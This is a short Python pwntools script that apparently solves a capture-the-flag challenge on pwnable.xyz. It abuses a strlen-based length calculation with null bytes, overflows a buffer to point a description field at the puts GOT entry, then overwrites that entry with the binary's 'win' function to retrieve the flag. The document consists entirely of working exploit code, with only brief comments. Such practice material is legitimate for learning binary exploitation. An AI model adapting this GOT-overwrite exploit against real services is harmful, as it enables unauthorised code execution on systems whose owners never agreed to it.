from pwn import *

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30013)
elf = ELF('./challenge')

def concat(name):
    p.sendlineafter('> ', '1')
    p.sendafter('Name: ', name)

def edit(desc):
    p.sendlineafter('> ', '2')
    p.sendafter('Desc: ', desc)

p.sendafter('Name: ', '\x00')   # use strlen to calculate str length so use \x00 to make maxlen -(-1)
p.sendafter('Desc: ', 'a')

for i in range(8):  # increase the maxlen to make it large enough to hijack the desc's address
    concat('\x00')

concat(b'\x00'*0x80+p64(elf.got['puts']))
edit(p64(elf.sym['win']))

print(p.recvuntil('}'))